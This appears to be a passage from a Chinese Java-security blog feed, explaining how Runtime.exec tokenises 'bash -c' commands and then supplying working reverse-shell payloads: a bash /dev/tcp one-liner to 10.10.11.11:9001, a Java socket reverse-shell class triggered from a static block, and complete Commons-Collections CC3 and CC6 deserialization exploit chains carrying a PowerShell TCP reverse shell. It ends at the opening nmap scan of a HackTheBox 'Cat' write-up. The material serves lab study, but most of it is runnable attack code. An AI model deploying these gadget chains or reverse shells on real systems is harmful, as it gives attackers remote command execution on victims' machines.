class="hljs-variable">stdInput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(errorStream));<br>            String str;<br>            <span class="hljs-keyword">while</span> ((str=stdInput.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>                System.out.println(str);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250731173825562.png" alt="image-20250731173825562"></p><p>很明显 他不能正确执行，看到报错信息他好像是吧 我们想要 -c 执行的命令字符串，当作可执行文件去执行了。为什么会这样呢？</p><p>其实也很简单，我们先来了解 bash -c</p><p><code>bash -c</code> 三步模型：解析，扩展&#x2F;填充，执行</p><p>解析：查看命令行中的 特殊意义的字符 重定向：<code>&gt;</code> 填充字段：<code>$1</code> 等</p><p>填充：就是识别后边字符串，赋值到 <code>$1</code> <code>$2</code> … 并以<span style="color:#FF0000;">普通字符串</span>填充到指定位置</p><p>执行：如果是填充的，就会当作普通字符串处理，所以不会解析重定向字符，就反弹不了 shell</p><p>看我们的报错信息 <code>bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1: No such file or directory</code> 这就不难理解了</p><p>我们来分析一下这个流程</p><p>java 的 StringTokenizer 分词后，识别到 <code>“$*”</code> 会把后续的 <code>bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1</code> 赋值给 <code>$1</code> 然后填充到 <code>$*</code> , <code>&quot;$*&quot;</code>，带了双引号， 把所有值当成一整个字符串，bash 把 <code>$1</code> 当成命令，后续的 <code>$2</code>… 都识别为命令参数，所以把这个参数当成命令或可执行文件了，没有 <code>$2</code> … 所以没有参数，就产生了我们看到的报错 <code>bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1: No such file or directory</code> </p><h5 id="正确的-payload"><a href="#正确的-payload" class="headerlink" title="正确的 payload"></a>正确的 payload</h5><p>我们可以给 <code>$*</code> 或者 <code>$@</code> 后边加上管道符 <code>|</code> 把字符串放入标准输入 <code>stdin</code> 在重定向给 一个新的 bash </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c <span class="hljs-variable">$@</span>|bash 0 <span class="hljs-built_in">echo</span> bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c $*|bash 0 <span class="hljs-built_in">echo</span> bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>java 的 StringTokenizer 分词器会把这个命令分为了 这些词</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250803173127171.png" alt="image-20250803173127171" style="zoom:67%;" /><ol><li><p>也就是会先传递 <code>bash</code> 字符串，开始 bash 会话</p></li><li><p>传递 <code>-c</code> 告诉当前 bash 执行后面的字符串</p></li><li><p>传递 <code>$@|bash</code> 这是会对 $@ 进行填充，且 <code>|</code> 管道符不是填充过来的，会被 bash 识别，生效 ，将流传给一个新的 bash</p></li><li><p><code>$@</code> 被依次填充为 <code>&quot;echo&quot;</code> <code>&quot;bash&quot;</code> <code>&quot;-i&quot;</code> <code>&quot;&gt;&amp;&quot;</code> <code>&quot;/dev/tcp/10.10.11.11/9001&quot;</code> <code>&quot;0&gt;&amp;1&quot;</code></p></li><li><p>echo 会被识别为 “bash -c” 的命令，后续的都是 echo 命令的参数，所以会输出为反弹没了的字符串</p></li><li><p>最后 通过管道传递给 新的 bash，从而执行命令</p></li></ol><p>可以成功反弹 shell</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250803181216335.png" alt="image-20250803181216335"></p><h2 id="与反序列化联合"><a href="#与反序列化联合" class="headerlink" title="与反序列化联合"></a>与反序列化联合</h2><p>这里举几个有代表性的例子就可以了，基本原理都是相同的，反序列主要分为类加载命令执行和反射命令执行</p><h3 id="类加载（CC3-CC4）"><a href="#类加载（CC3-CC4）" class="headerlink" title="类加载（CC3&#x2F;CC4）"></a>类加载（CC3&#x2F;CC4）</h3><p>关键就是后边的两步</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span><span class="hljs-selector-class">.trax</span>.TrAXFilter<span class="hljs-selector-id">#TrAXFilter</span><br>                    javax<span class="hljs-selector-class">.xml</span><span class="hljs-selector-class">.transform</span>.Templates#newTransformer<br></code></pre></td></tr></table></figure><p>Templates#newTransformer 这个我们在学习 fastjson 的各种反序列化链的时候就非常熟悉了，他有定义类并实现类初始化的能力，也就是可以执行 static 静态代码块</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250803193606078.png" alt="image-20250803193606078"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250803193641122.png" alt="image-20250803193641122"></p><p>这里就不过多赘述了，直接看利用代码吧</p><h4 id="CC3-相关代码"><a href="#CC3-相关代码" class="headerlink" title="CC3 相关代码"></a>CC3 相关代码</h4><p><strong>要加载的恶意类 JavaSocketRevShell</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.windows;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaSocketRevShell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pumpStream</span><span class="hljs-params">(InputStream in, OutputStream out)</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                <span class="hljs-type">int</span> bytesRead;<br>                <span class="hljs-keyword">while</span> ((bytesRead = in.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                    out.write(buffer, <span class="hljs-number">0</span>, bytesRead);<br>                    out.flush();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    in.close();<br>                    out.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException ignored) &#123;&#125;<br>            &#125;<br>        &#125;).start();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">conn</span><span class="hljs-params">(String host, <span class="hljs-type">int</span> port, String... cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(host, port)) &#123;<br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">pb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmd);<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> pb.start();<br>            pumpStream(socket.getInputStream(), process.getOutputStream());<br>            pumpStream(process.getInputStream(), socket.getOutputStream());<br>            pumpStream(process.getErrorStream(), socket.getOutputStream());<br>            process.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                conn(<span class="hljs-string">&quot;10.10.11.11&quot;</span>, <span class="hljs-number">9001</span>, <span class="hljs-string">&quot;powershell.exe&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            &#125;<br>        &#125;).start();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>注意：</p><p>​这里在 static 通过起一个新线程，从而避免了 JVM 在执行完静态代码以后，把我们的 powershell 管道（socket）资源回收。</p><p>new Thread(() -&gt; {<br>            try {<br>                conn(“10.10.11.11”, 9001, “powershell.exe”);<br>            } catch (Exception e) {<br>            }<br>        }).start();</p></blockquote><p><strong>CC3 反序列化链</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.windows;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassLoaderRevShell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvil() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> ctClass.get(<span class="hljs-string">&quot;com.lingx5.windows.JavaSocketRevShell&quot;</span>);<br>        <span class="hljs-keyword">return</span> evil.toBytecode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(Object obj, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; clazz = obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(filedName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] evilBytes = getEvil();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;evil&quot;</span>);<br>        setFiled(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;evilBytes&#125;);<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-literal">null</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;lingx5&quot;</span>);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry, <span class="hljs-string">&quot;1&quot;</span>);<br>        setFiled(lazyMap, <span class="hljs-string">&quot;factory&quot;</span>, transformerChain);<br>        lazyMap.remove(<span class="hljs-string">&quot;lingx5&quot;</span>);<br><br>        <span class="hljs-comment">// 序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(hashMap);<br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250803214227652.png" alt="image-20250803214227652"></p><p>成功反弹</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250803212640437.png" alt="image-20250803212640437"></p><p>CC4的利用方法也是一样的</p><h3 id="命令执行（CC1-CC6）"><a href="#命令执行（CC1-CC6）" class="headerlink" title="命令执行（CC1&#x2F;CC6）"></a>命令执行（CC1&#x2F;CC6）</h3><p>这里以CC6为例吧，其实很简单了，就是用Runtime的exec执行命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.windows;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6RevShell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(Object obj, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class&lt;?&gt; clazz = obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(filedName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#x27;10.10.11.11&#x27;&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">9001</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span><br>                <span class="hljs-string">&quot;powershell.exe $client = New-Object System.Net.Sockets.TCPClient(&quot;</span>+ip+<span class="hljs-string">&quot;,&quot;</span>+port+<span class="hljs-string">&quot;);&quot;</span> +<br>                <span class="hljs-string">&quot;$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span>;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;cmd&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-literal">null</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;lingx5&quot;</span>);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry, <span class="hljs-string">&quot;1&quot;</span>);<br>        setFiled(lazyMap, <span class="hljs-string">&quot;factory&quot;</span>, chainedTransformer);<br>        lazyMap.remove(<span class="hljs-string">&quot;lingx5&quot;</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(hashMap);<br><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功反弹</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250803215056257.png" alt="image-20250803215056257"></p><p>另外还有fastjson的一些连以及CB链都可以实现，这里就不一一列举了，思路都是一样的</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://f5.pm/go-19610.html">Java Runtime.getRuntime().exec 由表及里</a></p><p><a href="https://www.jianshu.com/p/eb41a0291123">Java Runtime.exe() 执行命令与反弹 shell（上） - 简书</a></p><p><a href="https://www.jianshu.com/p/ae3922db1f70">Java Runtime.exe() 执行命令与反弹 shell（下） - 简书</a></p><p><a href="https://www.javasec.org/javase/CommandExecution/">https://www.javasec.org/javase/CommandExecution/</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-cat 靶机</title>
    <link href="/2025/07/19/HTB-cat-%E9%9D%B6%E6%9C%BA/"/>
    <url>/2025/07/19/HTB-cat-%E9%9D%B6%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="HTB-cat-靶机"><a href="#HTB-cat-靶机" class="headerlink" title="HTB-cat 靶机"></a>HTB-cat 靶机</h1><p>靶机地址: <a href="https://app.hackthebox.com/machines/Cat">https://app.hackthebox.com/machines/Cat</a></p><p>一台中等难度的靶机，主要是练习利用来 xss 钓鱼，进行攻克的靶机。</p><h2 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 10.10.11.53 -o ports<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap <span class="hljs-number">7.95</span> ( https://<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2025</span>-<span class="hljs-number">07</span>-<span class="hljs-number">18</span> <span class="hljs-number">23</span>:<span class="hljs-number">19</span> EDT<br>Warning: <span class="hljs-number">10.10</span>.<span class="hljs-number">11.53</span> giving <span class="hljs-keyword">up</span> <span class="hljs-keyword">on</span> port because retransmission cap hit (<span 